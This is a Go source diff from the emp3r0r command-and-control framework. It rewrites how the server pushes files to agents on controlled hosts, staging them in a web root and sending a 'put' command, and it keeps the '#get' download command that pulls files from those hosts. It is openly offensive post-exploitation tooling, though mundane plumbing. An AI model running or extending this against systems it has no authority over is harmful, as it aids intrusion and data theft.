@@ -1,17 +1,15 @@
 package cc
 
 import (
-	"crypto/sha256"
-	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"io/ioutil"
 	"os"
 	"sync"
 	"time"
 
 	"github.com/google/uuid"
 	"github.com/jm33-m0/emp3r0r/core/lib/agent"
+	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
@@ -48,48 +46,41 @@ func StatFile(filepath string, a *agent.SystemInfo) (fi *util.FileStat, err erro
 
 // PutFile put file to agent
 func PutFile(lpath, rpath string, a *agent.SystemInfo) error {
-	// open and read the target file
-	f, err := os.Open(lpath)
-	if err != nil {
-		CliPrintError("PutFile: %v", err)
-		return err
-	}
-	bytes, err := ioutil.ReadAll(f)
-	if err != nil {
-		CliPrintError("PutFile: %v", err)
-		return err
-	}
-
 	// file sha256sum
-	sum := sha256.Sum256(bytes)
-
+	CliPrintInfo("Calculating sha256sum of %s", lpath)
+	sum := tun.SHA256SumFile(lpath)
 	// file size
-	size := len(bytes)
+	size := util.FileSize(lpath)
 	sizemB := float32(size) / 1024 / 1024
 	CliPrintInfo("\nPutFile:\nUploading '%s' to\n'%s' "+
 		"on %s, agent [%d]\n"+
 		"size: %d bytes (%.2fMB)\n"+
-		"sha256sum: %x",
+		"sha256sum: %s",
 		lpath, rpath,
 		a.IP, Targets[a].Index,
 		size, sizemB,
 		sum,
 	)
 
-	// base64 encode
-	payload := base64.StdEncoding.EncodeToString(bytes)
-
-	fileData := agent.MsgTunData{
-		Payload: "FILE" + agent.OpSep + rpath + agent.OpSep + payload,
-		Tag:     a.Tag,
-	}
-
-	// send
-	err = Send2Agent(&fileData, a)
+	// move file to wwwroot, then move it back when we are done with it
+	err := os.Rename(lpath, WWWRoot+util.FileBaseName(lpath))
 	if err != nil {
-		CliPrintError("PutFile: %v", err)
-		return err
+		return fmt.Errorf("Move %s to %s: %v", lpath, WWWRoot+util.FileBaseName(lpath), err)
 	}
+	defer func() {
+		err := os.Rename(WWWRoot+util.FileBaseName(lpath), lpath)
+		if err != nil {
+			CliPrintWarning("Move %s to %s: %v", WWWRoot+util.FileBaseName(lpath), lpath, err)
+		}
+	}()
+
+	// send cmd
+	cmd := fmt.Sprintf("put %s %s %d", lpath, rpath, size)
+	err = SendCmd(cmd, a)
+	if err != nil {
+		return fmt.Errorf("PutFile send command: %v", err)
+	}
+	CliPrintInfo("Waiting for response from agent %s", a.Tag)
 	return nil
 }
 
@@ -101,6 +92,7 @@ func GetFile(filepath string, a *agent.SystemInfo) error {
 			return fmt.Errorf("GetFile mkdir %s: %v", FileGetDir, err)
 		}
 	}
+	CliPrintInfo("Waiting for response from agent %s", a.Tag)
 	var data agent.MsgTunData
 	filename := FileGetDir + util.FileBaseName(filepath) // will copy the downloaded file here when we are done
 	tempname := filename + ".downloading"                // will be writing to this file
@@ -141,7 +133,6 @@ func GetFile(filepath string, a *agent.SystemInfo) error {
 
 	// cmd
 	cmd := fmt.Sprintf("#get %s %d %s", filepath, offset, ftpSh.Token)
-	// register FTP handler
 	data.Payload = fmt.Sprintf("cmd%s%s", agent.OpSep, cmd)
 	data.Tag = a.Tag
 	err = Send2Agent(&data, a)
